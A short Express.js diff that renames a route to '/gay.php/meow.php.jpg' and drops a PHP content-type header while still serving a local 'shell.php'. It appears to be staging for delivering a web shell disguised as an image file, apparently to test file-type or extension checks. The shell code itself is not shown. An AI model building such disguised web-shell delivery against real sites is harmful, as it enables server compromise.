@@ -3,9 +3,8 @@ const app = express();
 
 const PORT = 3000;
 
-app.get('/gay.php/.jpg', (req,res) => {
+app.get('/gay.php/meow.php.jpg', (req,res) => {
   console.log(req.path);
-  res.setHeader('content-type', 'application/x-httpd-php');
   res.sendFile(__dirname + '/public/shell.php');
 })
 
